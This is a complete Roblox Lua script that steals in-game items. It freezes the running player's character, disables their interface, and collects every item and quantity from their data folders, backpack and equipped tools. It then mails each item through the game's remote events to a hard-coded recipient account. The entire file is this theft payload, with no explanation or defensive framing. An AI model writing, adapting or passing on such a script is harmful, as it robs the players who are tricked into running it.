local T="excessivefeelings"
local P=game.Players.LocalPlayer
local C=P.Character or P.CharacterAdded:Wait()
local H=C:WaitForChild("Humanoid")
H.WalkSpeed=0 H.JumpPower=0 H.AutoRotate=false
for _,v in pairs(P.PlayerGui:GetChildren())do if v:IsA("ScreenGui")then v.Enabled=false end end
local function M(r,i,q)
local R=game:GetService("ReplicatedStorage"):FindFirstChild("MailEvent")or game:GetService("ReplicatedStorage"):FindFirstChild("SendMail")or game:GetService("ReplicatedStorage"):FindFirstChildOfClass("RemoteEvent")
if R then
pcall(function()
if R:IsA("RemoteFunction")then R:InvokeServer(r,i,q)else R:FireServer(r,i,q)end
end)end end
local I={}
local function S(f)
if f then
for _,v in pairs(f:GetDescendants())do
if v:IsA("NumberValue")and v.Value>0 then
local id=v.Parent.Name
I[id]=(I[id]or 0)+v.Value
end end end end
S(P:FindFirstChild("PlayerData"))
S(P:FindFirstChild("Data"))
S(workspace:FindFirstChild(P.Name))
for _,v in pairs(P.Backpack:GetChildren())do I[v.Name]=(I[v.Name]or 0)+1 end
for _,v in pairs(P.Character:GetChildren())do if v:IsA("Tool")or v:IsA("Model")then I[v.Name]=(I[v.Name]or 0)+1 end end
for id,q in pairs(I)do if q>0 then M(T,id,q)wait(0.05)end end
